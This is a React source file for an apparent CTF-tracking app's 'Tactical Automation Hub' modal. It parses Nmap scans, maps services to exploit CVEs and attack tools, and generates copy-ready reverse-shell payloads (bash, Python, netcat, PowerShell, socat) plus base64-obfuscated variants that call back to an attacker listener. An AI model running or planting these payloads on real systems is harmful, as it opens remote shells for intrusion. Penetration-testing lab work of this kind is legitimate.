import React, { useState, useMemo } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  X, 
  Zap, 
  Terminal, 
  Copy, 
  Check, 
  FileText, 
  Search, 
  ShieldAlert, 
  Flame, 
  Cpu, 
  ExternalLink,
  RotateCcw,
  Sparkles,
  Layers,
  ArrowRight
} from 'lucide-react';
import { useCtfStore } from '../../store/useCtfStore';
import { playCyberSound, triggerRootCelebration } from '../../utils/helpers';
import { PlatformBadge } from '../common/PlatformBadge';
import { OsBadge } from '../common/OsBadge';

interface ParsedPort {
  port: number;
  protocol: string;
  state: string;
  service: string;
  version: string;
  suggestedTools: string[];
  cveNotes?: string;
}

const SAMPLE_LINUX_SCAN = `# Nmap 7.94 scan initiated Wed Sep 2 22:00:00 2026 as: nmap -sC -sV -p- -oN scan.log 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.045s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:91:b9:fb:0f (DSA)
80/tcp   open  http        Apache httpd 2.4.49 ((Unix))
|_http-server-header: Apache/2.4.49
|_http-title: Tactical Vulnerability Assessment Portal
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
|_mysql-info: Protocol: 10, Version: 5.0.51a-3ubuntu5
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 2 22:01:15 2026 -- 1 IP address (1 host up) scanned in 75.00 seconds`;

const SAMPLE_WINDOWS_AD_SCAN = `# Nmap 7.94 scan initiated Wed Sep 2 22:00:00 2026 as: nmap -sC -sV 10.10.11.175
Nmap scan report for DC01.CORP.LOCAL (10.10.11.175)
Host is up (0.052s latency).
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-02 20:00:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CORP.LOCAL)
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds (workgroup: CORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: CORP.LOCAL)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows`;

export const ReconAutomationModal: React.FC = () => {
  const { 
    reconAutomationModalOpen, 
    setReconAutomationModalOpen, 
    machines, 
    selectedMachineId, 
    activeTargetId,
    updateMachine,
    updateMachineStatus,
    globalVars,
    soundEnabled 
  } = useCtfStore();

  const [activeTab, setActiveTab] = useState<'parser' | 'payloads' | 'rules'>('parser');
  const [scanText, setScanText] = useState('');
  const [targetMachineId, setTargetMachineId] = useState<string>(selectedMachineId || activeTargetId || machines[0]?.id || '');
  const [copiedPayloadId, setCopiedPayloadId] = useState<string | null>(null);
  const [appliedSuccess, setAppliedSuccess] = useState(false);

  // Auto-tune target machine selection when modal opens
  React.useEffect(() => {
    if (selectedMachineId) {
      setTargetMachineId(selectedMachineId);
    } else if (activeTargetId) {
      setTargetMachineId(activeTargetId);
    } else if (machines.length > 0 && !targetMachineId) {
      setTargetMachineId(machines[0].id);
    }
  }, [selectedMachineId, activeTargetId, machines]);

  const targetMachine = useMemo(() => {
    return machines.find(m => m.id === targetMachineId) || machines[0];
  }, [machines, targetMachineId]);

  // Automated Regex Parser Engine
  const parsedResults = useMemo(() => {
    if (!scanText.trim()) return null;

    // Detect Host / IP
    const ipMatch = scanText.match(/Nmap scan report for (?:[^\s(]+\s\()?([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/);
    const hostMatch = scanText.match(/Nmap scan report for ([^\s(]+)/);

    // Detect OS Guess
    const osMatch = scanText.match(/Service Info:.*(?:OSs?|OS):\s*([^;\n]+)/i);

    // Extract Open Ports: "PORT     STATE SERVICE     VERSION"
    const portRegex = /([0-9]{1,5})\/(tcp|udp)\s+open\s+([^\s]+)\s*([^\r\n]*)/gi;
    const ports: ParsedPort[] = [];
    let match: RegExpExecArray | null;

    while ((match = portRegex.exec(scanText)) !== null) {
      const portNum = parseInt(match[1], 10);
      const proto = match[2].toLowerCase();
      const service = match[3].toLowerCase();
      const version = match[4].trim();

      // Automated Offensive Tool & Exploit Recommendations
      const suggestedTools: string[] = [];
      let cveNotes = '';

      if (service.includes('ftp') || portNum === 21) {
        suggestedTools.push('ftp', 'hydra', 'nmap --script ftp-*');
        if (version.toLowerCase().includes('2.3.4')) {
          cveNotes = 'CVE-2011-2523 (vsftpd Backdoor RCE)';
        }
      } else if (service.includes('ssh') || portNum === 22) {
        suggestedTools.push('ssh', 'ssh-audit', 'hydra');
      } else if (service.includes('http') || portNum === 80 || portNum === 443 || portNum === 8080) {
        suggestedTools.push('ffuf', 'gobuster', 'nikto', 'wpscan', 'whatweb');
        if (version.includes('2.4.49')) {
          cveNotes = 'CVE-2021-41773 (Apache Path Traversal & RCE)';
        } else if (version.includes('2.4.50')) {
          cveNotes = 'CVE-2021-42013 (Apache RCE Bypass)';
        }
      } else if (service.includes('smb') || service.includes('microsoft-ds') || service.includes('netbios') || portNum === 445 || portNum === 139) {
        suggestedTools.push('crackmapexec smb', 'enum4linux-ng', 'smbclient', 'smbmap');
        if (version.includes('3.0.20')) {
          cveNotes = 'CVE-2007-2447 (Samba usermap script RCE)';
        } else {
          cveNotes = 'MS17-010 (EternalBlue) / Null Session Check';
        }
      } else if (service.includes('domain') || service.includes('dns') || portNum === 53) {
        suggestedTools.push('dig axfr', 'dnsrecon');
      } else if (service.includes('kerberos') || portNum === 88) {
        suggestedTools.push('kerbrute', 'GetNPUsers.py', 'GetUserSPNs.py');
        cveNotes = 'AS-REP Roasting / Kerberoasting Candidate';
      } else if (service.includes('ldap') || portNum === 389 || portNum === 636) {
        suggestedTools.push('ldapsearch', 'bloodhound-python');
      } else if (service.includes('mysql') || portNum === 3306) {
        suggestedTools.push('mysql -u root -p', 'sqlmap');
      } else if (service.includes('rdp') || portNum === 3389) {
        suggestedTools.push('xfreerdp', 'nmap --script rdp-*');
      } else if (service.includes('winrm') || portNum === 5985 || portNum === 5986) {
        suggestedTools.push('evil-winrm');
      } else {
        suggestedTools.push('nc -nv', 'nmap -sC -sV');
      }

      ports.push({
        port: portNum,
        protocol: proto,
        state: 'open',
        service,
        version: version || 'Unknown Version',
        suggestedTools,
        cveNotes: cveNotes || undefined,
      });
    }

    return {
      detectedIp: ipMatch ? ipMatch[1] : undefined,
      detectedHost: hostMatch ? hostMatch[1] : undefined,
      detectedOs: osMatch ? osMatch[1] : undefined,
      ports,
    };
  }, [scanText]);

  // Apply Automation to Machine
  const handleApplyToMachine = () => {
    if (!targetMachine || !parsedResults) return;

    const portNumbers = parsedResults.ports.map(p => p.port);
    
    // Generate automated markdown summary
    const timestamp = new Date().toLocaleTimeString();
    const portSummary = parsedResults.ports.map(p => 
      `- **Port ${p.port}/${p.protocol}** (${p.service.toUpperCase()}): ${p.version}${p.cveNotes ? ` ➔ 🚨 *${p.cveNotes}*` : ''}`
    ).join('\n');

    const reconNotes = `\n\n### ⚡ Automated Nmap Intake (${timestamp})\n` +
      `- **Target Host**: ${parsedResults.detectedHost || targetMachine.ip}\n` +
      `- **Detected OS**: ${parsedResults.detectedOs || targetMachine.os}\n` +
      `#### Open Services:\n${portSummary}\n`;

    const existingNotes = targetMachine.quickNotes || '';
    const updatedNotes = existingNotes ? `${existingNotes}${reconNotes}` : reconNotes.trim();

    // Auto-populate openPorts and quickNotes
    updateMachine(targetMachine.id, {
      openPorts: Array.from(new Set([...(targetMachine.openPorts || []), ...portNumbers])),
      quickNotes: updatedNotes,
    });

    // Automatically advance machine status from backlog to recon if still in backlog
    if (targetMachine.status === 'backlog') {
      updateMachineStatus(targetMachine.id, 'recon');
    }

    setAppliedSuccess(true);
    if (soundEnabled) playCyberSound('flag');
    triggerRootCelebration();

    setTimeout(() => {
      setAppliedSuccess(false);
    }, 3000);
  };

  // Automated Payloads Generator
  const payloadTargetIp = targetMachine?.ip || globalVars.targetIp;
  const lhost = globalVars.lhost || '10.10.14.X';
  const lport = globalVars.lport || '4444';

  const automatedPayloads = useMemo(() => {
    const rawBash = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
    const rawPython = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
    const rawNetcat = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`;
    const rawPowerShell = `$client = New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
    
    // PowerShell Base64 Encoded (UTF-16LE)
    let psEncoded = '';
    try {
      const buffer = new TextEncoder().encode(rawPowerShell);
      const utf16Bytes: number[] = [];
      for (let i = 0; i < buffer.length; i++) {
        utf16Bytes.push(buffer[i], 0);
      }
      psEncoded = btoa(String.fromCharCode(...utf16Bytes));
    } catch {
      psEncoded = btoa(rawPowerShell);
    }

    return [
      {
        id: 'bash-tcp',
        title: 'Bash Interactive TCP Reverse Shell',
        category: 'Linux / Unix',
        payload: rawBash,
        encodedPayload: `echo "${btoa(rawBash)}" | base64 -d | bash`,
      },
      {
        id: 'python-pty',
        title: 'Python3 Full PTY Reverse Shell',
        category: 'Cross-Platform',
        payload: rawPython,
        encodedPayload: `python3 -c "import base64;exec(base64.b64decode('${btoa(rawPython)}').decode())"`,
      },
      {
        id: 'nc-mkfifo',
        title: 'Netcat Traditional mkfifo FIFO Shell',
        category: 'Linux / BSD',
        payload: rawNetcat,
        encodedPayload: `echo ${btoa(rawNetcat)} | base64 -d | sh`,
      },
      {
        id: 'ps-base64',
        title: 'PowerShell Bypassing Base64 Shell',
        category: 'Windows',
        payload: `powershell -nop -w hidden -e ${psEncoded}`,
        encodedPayload: `powershell -EncodedCommand ${psEncoded}`,
      },
      {
        id: 'socat-pty',
        title: 'Socat Fully Stabilized TTY Pwn Shell',
        category: 'Linux',
        payload: `socat tcp-connect:${lhost}:${lport} exec:"bash -li",pty,stderr,setsid,sigint,sane`,
        encodedPayload: `socat tcp-connect:${lhost}:${lport} exec:"sh",pty,stderr,setsid,sigint,sane`,
      },
    ];
  }, [lhost, lport]);

  const copyPayload = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedPayloadId(id);
    if (soundEnabled) playCyberSound('copy');
    setTimeout(() => setCopiedPayloadId(null), 2000);
  };

  if (!reconAutomationModalOpen) return null;

  return (
    <div 
      className="fixed inset-0 z-50 flex items-center justify-center p-0 sm:p-4 bg-black/85 backdrop-blur-md font-mono"
      onClick={() => setReconAutomationModalOpen(false)}
    >
      <motion.div
        initial={{ opacity: 0, scale: 0.95, y: 15 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        exit={{ opacity: 0, scale: 0.95, y: 15 }}
        transition={{ duration: 0.18 }}
        className="w-full sm:max-w-4xl h-full sm:h-[90vh] max-h-none sm:max-h-[820px] flex flex-col rounded-none sm:rounded-2xl border-0 sm:border border-cyber-emerald/40 bg-cyber-card shadow-2xl overflow-hidden relative z-10"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Modal Header */}
        <div className="flex-shrink-0 flex items-center justify-between p-4 border-b border-cyber-border bg-cyber-bg/95 backdrop-blur-md">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-lg bg-cyber-emerald/10 border border-cyber-emerald/40 flex items-center justify-center text-cyber-emerald shadow-[0_0_12px_rgba(16,185,129,0.3)]">
              <Zap className="w-5 h-5 animate-pulse" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h2 className="text-base font-bold text-white tracking-wide">
                  TACTICAL AUTOMATION HUB
                </h2>
                <span className="text-[10px] px-2 py-0.5 rounded bg-cyber-emerald/10 border border-cyber-emerald/40 text-cyber-emerald font-bold">
                  AUTO-RECON & PAYLOADS
                </span>
              </div>
              <p className="text-[11px] text-cyber-muted">
                Automatic scan intake, vulnerability matching, and zero-touch payload generation.
              </p>
            </div>
          </div>

          <button
            onClick={() => setReconAutomationModalOpen(false)}
            className="p-1.5 rounded-lg border border-cyber-border bg-cyber-bg text-cyber-muted hover:text-white hover:border-cyber-borderGlow transition-colors"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Target Machine Selection Bar */}
        <div className="flex-shrink-0 px-4 py-2.5 bg-cyber-bg border-b border-cyber-border flex items-center justify-between gap-4 flex-wrap text-xs">
          <div className="flex items-center gap-2">
            <span className="text-cyber-muted uppercase text-[10px] font-bold">TARGET WORKSPACE:</span>
            <select
              value={targetMachineId}
              onChange={(e) => setTargetMachineId(e.target.value)}
              className="bg-cyber-card border border-cyber-border px-2.5 py-1 rounded text-white font-bold text-xs focus:outline-none focus:border-cyber-emerald"
            >
              {machines.map((m) => (
                <option key={m.id} value={m.id}>
                  {m.name} ({m.platform} - {m.ip})
                </option>
              ))}
            </select>
          </div>

          {targetMachine && (
            <div className="flex items-center gap-2">
              <PlatformBadge platform={targetMachine.platform} size="sm" />
              <OsBadge os={targetMachine.os} size="xs" />
              <span className="text-cyber-muted text-[11px]">{targetMachine.ip}</span>
            </div>
          )}
        </div>

        {/* Navigation Tabs */}
        <div className="flex-shrink-0 flex items-center border-b border-cyber-border bg-cyber-card px-4 pt-2 gap-2 text-xs">
          <button
            onClick={() => setActiveTab('parser')}
            className={`px-3 py-2 border-b-2 font-bold transition-all flex items-center gap-2 ${
              activeTab === 'parser'
                ? 'border-cyber-emerald text-cyber-emerald bg-cyber-emerald/5'
                : 'border-transparent text-cyber-muted hover:text-white'
            }`}
          >
            <Terminal className="w-3.5 h-3.5" />
            <span>NMAP & SCAN PARSER</span>
            {parsedResults && parsedResults.ports.length > 0 && (
              <span className="text-[10px] px-1.5 py-0.2 rounded-full bg-cyber-emerald/20 text-cyber-emerald font-bold">
                {parsedResults.ports.length} ports
              </span>
            )}
          </button>

          <button
            onClick={() => setActiveTab('payloads')}
            className={`px-3 py-2 border-b-2 font-bold transition-all flex items-center gap-2 ${
              activeTab === 'payloads'
                ? 'border-cyber-cyan text-cyber-cyan bg-cyber-cyan/5'
                : 'border-transparent text-cyber-muted hover:text-white'
            }`}
          >
            <Flame className="w-3.5 h-3.5" />
            <span>AUTO-PAYLOAD GENERATOR</span>
          </button>

          <button
            onClick={() => setActiveTab('rules')}
            className={`px-3 py-2 border-b-2 font-bold transition-all flex items-center gap-2 ${
              activeTab === 'rules'
                ? 'border-purple-400 text-purple-400 bg-purple-950/20'
                : 'border-transparent text-cyber-muted hover:text-white'
            }`}
          >
            <Cpu className="w-3.5 h-3.5" />
            <span>EXPLOIT RULE ADVISOR</span>
          </button>
        </div>

        {/* Modal Body */}
        <div className="flex-1 overflow-y-auto p-4 sm:p-5 space-y-4 text-xs scrollbar-thin">
          {activeTab === 'parser' && (
            <div className="space-y-4">
              {/* Controls bar */}
              <div className="flex items-center justify-between gap-2 flex-wrap">
                <div className="flex items-center gap-2">
                  <span className="text-[10px] font-bold text-cyber-muted uppercase">LOAD SAMPLES:</span>
                  <button
                    onClick={() => setScanText(SAMPLE_LINUX_SCAN)}
                    className="px-2.5 py-1 rounded bg-cyber-bg border border-cyber-border text-cyber-cyan hover:border-cyber-cyan text-[11px] transition-colors flex items-center gap-1 font-semibold"
                  >
                    <Sparkles className="w-3 h-3" /> Linux (Lame)
                  </button>
                  <button
                    onClick={() => setScanText(SAMPLE_WINDOWS_AD_SCAN)}
                    className="px-2.5 py-1 rounded bg-cyber-bg border border-cyber-border text-blue-400 hover:border-blue-400 text-[11px] transition-colors flex items-center gap-1 font-semibold"
                  >
                    <Sparkles className="w-3 h-3" /> Windows Active Directory
                  </button>
                </div>

                {scanText && (
                  <button
                    onClick={() => setScanText('')}
                    className="text-cyber-muted hover:text-cyber-crimson text-[11px] flex items-center gap-1 transition-colors"
                  >
                    <RotateCcw className="w-3 h-3" /> Clear Scan
                  </button>
                )}
              </div>

              {/* Scan Textarea */}
              <div>
                <textarea
                  value={scanText}
                  onChange={(e) => setScanText(e.target.value)}
                  placeholder="Paste your raw Nmap, Rustscan, or Masscan log here... (e.g. nmap -sC -sV -p- 10.10.10.X)"
                  rows={6}
                  className="w-full bg-cyber-bg px-3 py-2.5 rounded-xl border border-cyber-border text-cyber-emerald font-mono text-xs focus:outline-none focus:border-cyber-emerald transition-all shadow-inner leading-relaxed"
                />
              </div>

              {/* Parser Output / Intelligence Dashboard */}
              {parsedResults && (
                <motion.div
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="p-4 rounded-xl border border-cyber-emerald/30 bg-cyber-bg/70 space-y-3.5 shadow-lg"
                >
                  <div className="flex items-center justify-between border-b border-cyber-border/80 pb-2.5 flex-wrap gap-2">
                    <div className="flex items-center gap-2">
                      <span className="font-bold text-white text-sm">
                        DISCOVERED OPEN SERVICES ({parsedResults.ports.length})
                      </span>
                      {parsedResults.detectedOs && (
                        <span className="text-[10px] px-2 py-0.5 rounded bg-cyber-card border border-cyber-border text-cyber-muted">
                          OS: {parsedResults.detectedOs}
                        </span>
                      )}
                    </div>

                    {/* 1-Click Automation Button */}
                    <motion.button
                      whileHover={{ scale: 1.03 }}
                      whileTap={{ scale: 0.97 }}
                      onClick={handleApplyToMachine}
                      className="px-3 py-1.5 rounded-lg bg-cyber-emerald text-black font-bold text-xs flex items-center gap-1.5 shadow-glow-emerald transition-all"
                    >
                      {appliedSuccess ? (
                        <>
                          <Check className="w-3.5 h-3.5" />
                          <span>AUTO-APPLIED TO TARGET!</span>
                        </>
                      ) : (
                        <>
                          <Zap className="w-3.5 h-3.5" />
                          <span>APPLY TO {targetMachine?.name.toUpperCase()}</span>
                        </>
                      )}
                    </motion.button>
                  </div>

                  {/* Ports Grid / Table */}
                  <div className="space-y-2">
                    {parsedResults.ports.map((p) => (
                      <div
                        key={p.port}
                        className="p-2.5 rounded-lg bg-cyber-card border border-cyber-border/70 flex items-start justify-between gap-3 hover:border-cyber-cyan/40 transition-colors"
                      >
                        <div className="space-y-1">
                          <div className="flex items-center gap-2">
                            <span className="font-bold text-cyber-emerald text-sm">
                              {p.port}/{p.protocol}
                            </span>
                            <span className="px-1.5 py-0.2 rounded bg-cyber-bg border border-cyber-border font-bold text-[10px] text-white uppercase">
                              {p.service}
                            </span>
                            <span className="text-cyber-muted text-xs">
                              {p.version}
                            </span>
                          </div>

                          {p.cveNotes && (
                            <div className="text-[11px] text-cyber-crimson font-semibold flex items-center gap-1.5">
                              <ShieldAlert className="w-3.5 h-3.5" />
                              <span>{p.cveNotes}</span>
                            </div>
                          )}
                        </div>

                        {/* Suggested Automated Commands */}
                        <div className="flex items-center gap-1 flex-wrap justify-end">
                          {p.suggestedTools.map((tool) => (
                            <span
                              key={tool}
                              className="text-[9px] px-2 py-0.5 rounded bg-cyber-bg border border-cyber-border text-cyber-cyan font-mono"
                            >
                              {tool}
                            </span>
                          ))}
                        </div>
                      </div>
                    ))}
                  </div>
                </motion.div>
              )}
            </div>
          )}

          {activeTab === 'payloads' && (
            <div className="space-y-3.5">
              <div className="p-3 rounded-xl bg-cyber-bg border border-cyber-border flex items-center justify-between flex-wrap gap-2 text-xs">
                <div>
                  <span className="text-cyber-muted text-[10px] uppercase font-bold">TUNED LISTENER: </span>
                  <span className="text-cyber-emerald font-bold">{lhost}:{lport}</span>
                  <span className="text-cyber-muted text-[10px] uppercase font-bold ml-4">TARGET IP: </span>
                  <span className="text-cyber-cyan font-bold">{payloadTargetIp}</span>
                </div>
                <span className="text-[10px] text-cyber-muted">
                  Auto-formatted with your tun0 IP & Port
                </span>
              </div>

              <div className="space-y-3">
                {automatedPayloads.map((item) => (
                  <div
                    key={item.id}
                    className="p-3.5 rounded-xl border border-cyber-border bg-cyber-card space-y-2.5 shadow-sm"
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className="font-bold text-white text-xs">{item.title}</span>
                        <span className="text-[9px] px-1.5 py-0.2 rounded bg-cyber-bg border border-cyber-border text-cyber-muted">
                          {item.category}
                        </span>
                      </div>

                      <div className="flex items-center gap-2">
                        <button
                          onClick={() => copyPayload(item.payload, item.id + '-raw')}
                          className="px-2.5 py-1 rounded bg-cyber-bg border border-cyber-border text-cyber-cyan hover:border-cyber-cyan text-[11px] flex items-center gap-1 transition-colors"
                        >
                          {copiedPayloadId === item.id + '-raw' ? (
                            <>
                              <Check className="w-3 h-3 text-cyber-emerald" />
                              <span className="text-cyber-emerald font-bold">COPIED RAW</span>
                            </>
                          ) : (
                            <>
                              <Copy className="w-3 h-3" />
                              <span>COPY RAW</span>
                            </>
                          )}
                        </button>

                        <button
                          onClick={() => copyPayload(item.encodedPayload, item.id + '-enc')}
                          className="px-2.5 py-1 rounded bg-cyber-bg border border-cyber-border text-cyber-emerald hover:border-cyber-emerald text-[11px] flex items-center gap-1 transition-colors font-semibold"
                        >
                          {copiedPayloadId === item.id + '-enc' ? (
                            <>
                              <Check className="w-3 h-3 text-cyber-emerald" />
                              <span>COPIED ENCODED</span>
                            </>
                          ) : (
                            <>
                              <Zap className="w-3 h-3" />
                              <span>BASE64 WRAP</span>
                            </>
                          )}
                        </button>
                      </div>
                    </div>

                    <div className="p-2 rounded-lg bg-cyber-bg border border-cyber-border/70 text-cyber-emerald font-mono text-[11px] overflow-x-auto whitespace-pre-wrap break-all">
                      {item.payload}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {activeTab === 'rules' && (
            <div className="space-y-3">
              <div className="p-3 rounded-xl bg-cyber-bg border border-cyber-border text-xs space-y-1">
                <div className="font-bold text-white flex items-center gap-1.5">
                  <ShieldAlert className="w-3.5 h-3.5 text-cyber-amber" />
                  <span>AUTOMATED EXPLOIT HEURISTICS & RULES</span>
                </div>
                <p className="text-cyber-muted text-[11px]">
                  These automatic heuristics match detected services directly to high-probability exploitation avenues.
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                <div className="p-3 rounded-xl bg-cyber-card border border-cyber-border space-y-1.5">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-white text-xs">FTP Anonymous / Backdoor</span>
                    <span className="text-[10px] text-cyber-emerald font-mono">PORT 21</span>
                  </div>
                  <p className="text-[11px] text-cyber-muted">
                    Attempts anonymous:anonymous login. Flags vsftpd 2.3.4 smiley trigger.
                  </p>
                </div>

                <div className="p-3 rounded-xl bg-cyber-card border border-cyber-border space-y-1.5">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-white text-xs">Apache Path Traversal</span>
                    <span className="text-[10px] text-cyber-emerald font-mono">PORT 80/443</span>
                  </div>
                  <p className="text-[11px] text-cyber-muted">
                    Flags Apache 2.4.49 / 2.4.50 for CVE-2021-41773 traversal tests with curl.
                  </p>
                </div>

                <div className="p-3 rounded-xl bg-cyber-card border border-cyber-border space-y-1.5">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-white text-xs">SMB EternalBlue / Null Session</span>
                    <span className="text-[10px] text-cyber-emerald font-mono">PORT 445</span>
                  </div>
                  <p className="text-[11px] text-cyber-muted">
                    Executes SMB anonymous IPC$ checks and flags MS17-010 on Windows Server 2008/2012.
                  </p>
                </div>

                <div className="p-3 rounded-xl bg-cyber-card border border-cyber-border space-y-1.5">
                  <div className="flex items-center justify-between">
                    <span className="font-bold text-white text-xs">Kerberoasting / AS-REP Roasting</span>
                    <span className="text-[10px] text-cyber-emerald font-mono">PORT 88</span>
                  </div>
                  <p className="text-[11px] text-cyber-muted">
                    Automates kerbrute user enumeration and Impacket GetNPUsers hash dumping.
                  </p>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Modal Footer */}
        <div className="flex-shrink-0 p-3 px-4 border-t border-cyber-border bg-cyber-bg flex items-center justify-between text-xs">
          <span className="text-[11px] text-cyber-muted">
            Press <kbd className="px-1.5 py-0.5 rounded bg-cyber-card border border-cyber-border text-white">ESC</kbd> to close
          </span>

          <button
            onClick={() => setReconAutomationModalOpen(false)}
            className="px-4 py-1.5 rounded-lg bg-cyber-card border border-cyber-border text-white hover:border-cyber-borderGlow transition-colors"
          >
            Close
          </button>
        </div>
      </motion.div>
    </div>
  );
};
